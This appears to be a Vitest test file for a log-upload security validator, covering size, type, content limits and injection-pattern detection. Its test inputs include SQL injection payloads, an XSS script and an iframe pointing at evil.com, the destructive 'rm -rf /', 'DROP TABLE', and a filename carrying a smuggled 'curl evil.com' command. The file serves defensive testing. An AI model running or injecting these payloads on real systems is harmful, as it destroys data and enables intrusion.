import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityValidator } from '../../server/middleware/security-validator';
import fs from 'fs';
import path from 'path';

describe('File Upload Validation', () => {
  describe('File Size Limits', () => {
    it('should reject files larger than 10MB', () => {
      // Create a buffer larger than 10MB (10 * 1024 * 1024 bytes)
      const largeFile = Buffer.alloc(11 * 1024 * 1024, 'a'); // 11MB
      
      const result = SecurityValidator.validateLogFile(largeFile, 'large-file.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats).toContain('File size exceeds maximum allowed limit');
    });

    it('should accept files smaller than 10MB', () => {
      // Create a buffer smaller than 10MB
      const smallFile = Buffer.from('2024-01-01 10:00:00 192.168.1.1 GET /api/test 200 1024\n'.repeat(1000));
      
      const result = SecurityValidator.validateLogFile(smallFile, 'small-file.log');
      
      expect(result.isValid).toBe(true);
      expect(result.threats).not.toContain('File size exceeds maximum allowed limit');
    });

    it('should accept files exactly at 10MB limit', () => {
      // Create a buffer exactly 10MB (10 * 1024 * 1024 bytes)
      const exactSizeFile = Buffer.alloc(10 * 1024 * 1024, 'a');
      
      const result = SecurityValidator.validateLogFile(exactSizeFile, 'exact-size.log');
      
      // Should pass size validation (other validations might fail due to content)
      expect(result.threats).not.toContain('File size exceeds maximum allowed limit');
    });
  });

  describe('File Type Validation', () => {
    it('should accept .log files', () => {
      const logContent = Buffer.from('2024-01-01 10:00:00 INFO Application started\n');
      
      const result = SecurityValidator.validateLogFile(logContent, 'application.log');
      
      expect(result.isValid).toBe(true);
    });

    it('should accept .txt files', () => {
      const txtContent = Buffer.from('Sample log entry\nAnother log entry\n');
      
      const result = SecurityValidator.validateLogFile(txtContent, 'logs.txt');
      
      expect(result.isValid).toBe(true);
    });

    it('should have proper filename validation', () => {
      const content = Buffer.from('Valid log content\n');
      
      // Test valid filenames
      expect(SecurityValidator.validateLogFile(content, 'valid-file.log').isValid).toBe(true);
      expect(SecurityValidator.validateLogFile(content, 'file_123.txt').isValid).toBe(true);
      expect(SecurityValidator.validateLogFile(content, 'app.log.txt').isValid).toBe(true);
    });
  });

  describe('Content Validation', () => {
    it('should detect binary content', () => {
      // Create binary content with ELF header
      const binaryContent = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01]);
      
      const result = SecurityValidator.validateLogFile(binaryContent, 'binary.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats).toContain('Binary content detected in log file');
    });

    it('should validate line length limits', () => {
      // Create content with a very long line (over 10000 chars)
      const longLine = 'a'.repeat(10001);
      const content = Buffer.from(`Normal line\n${longLine}\nAnother normal line\n`);
      
      const result = SecurityValidator.validateLogFile(content, 'long-lines.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats.some(threat => threat.includes('exceeds maximum length'))).toBe(true);
    });

    it('should validate line count limits', () => {
      // Create content with too many lines (over 100000)
      const manyLines = 'log entry\n'.repeat(100001);
      const content = Buffer.from(manyLines);
      
      const result = SecurityValidator.validateLogFile(content, 'many-lines.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats.some(threat => threat.includes('Too many lines'))).toBe(true);
    });
  });

  describe('Security Pattern Detection', () => {
    it('should detect SQL injection patterns', () => {
      const maliciousContent = Buffer.from(`
        2024-01-01 10:00:00 GET /api/users?id=1' UNION SELECT * FROM users--
        2024-01-01 10:01:00 POST /api/login {"username": "admin", "password": "' OR 1=1--"}
      `);
      
      const result = SecurityValidator.validateLogFile(maliciousContent, 'sql-injection.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats.some(threat => threat.includes('Suspicious pattern detected'))).toBe(true);
    });

    it('should detect script injection patterns', () => {
      const maliciousContent = Buffer.from(`
        2024-01-01 10:00:00 GET /search?q=<script>alert('xss')</script>
        2024-01-01 10:01:00 POST /comment {"text": "<iframe src='evil.com'></iframe>"}
      `);
      
      const result = SecurityValidator.validateLogFile(maliciousContent, 'xss-attempts.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats.some(threat => threat.includes('Suspicious pattern detected'))).toBe(true);
    });

    it('should detect command injection patterns', () => {
      const maliciousContent = Buffer.from(`
        2024-01-01 10:00:00 GET /api/exec?cmd=ls; rm -rf /
        2024-01-01 10:01:00 POST /upload {"filename": "test.txt; curl evil.com"}
      `);
      
      const result = SecurityValidator.validateLogFile(maliciousContent, 'command-injection.log');
      
      expect(result.isValid).toBe(false);
      expect(result.threats.some(threat => threat.includes('Suspicious pattern detected'))).toBe(true);
    });
  });

  describe('Sanitization', () => {
    it('should sanitize valid content', () => {
      const cleanContent = Buffer.from(`
        2024-01-01 10:00:00 INFO Application started
        2024-01-01 10:01:00 GET /api/users 200 OK
        2024-01-01 10:02:00 POST /api/login 401 Unauthorized
      `);
      
      const result = SecurityValidator.validateLogFile(cleanContent, 'clean.log');
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedContent).toBeDefined();
      expect(result.sanitizedContent?.length).toBeGreaterThan(0);
    });

    it('should not provide sanitized content for invalid files', () => {
      const maliciousContent = Buffer.from('SELECT * FROM users; DROP TABLE users;--');
      
      const result = SecurityValidator.validateLogFile(maliciousContent, 'malicious.log');
      
      expect(result.isValid).toBe(false);
      expect(result.sanitizedContent).toBeUndefined();
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty files', () => {
      const emptyContent = Buffer.alloc(0);
      
      const result = SecurityValidator.validateLogFile(emptyContent, 'empty.log');
      
      expect(result.isValid).toBe(true);
      expect(result.threats).toHaveLength(0);
    });

    it('should handle files with only whitespace', () => {
      const whitespaceContent = Buffer.from('   \n\n\t\t   \n   ');
      
      const result = SecurityValidator.validateLogFile(whitespaceContent, 'whitespace.log');
      
      expect(result.isValid).toBe(true);
    });

    it('should handle unicode content', () => {
      const unicodeContent = Buffer.from('2024-01-01 用户登录 ñame=José 状态=成功\n', 'utf8');
      
      const result = SecurityValidator.validateLogFile(unicodeContent, 'unicode.log');
      
      expect(result.isValid).toBe(true);
    });
  });
});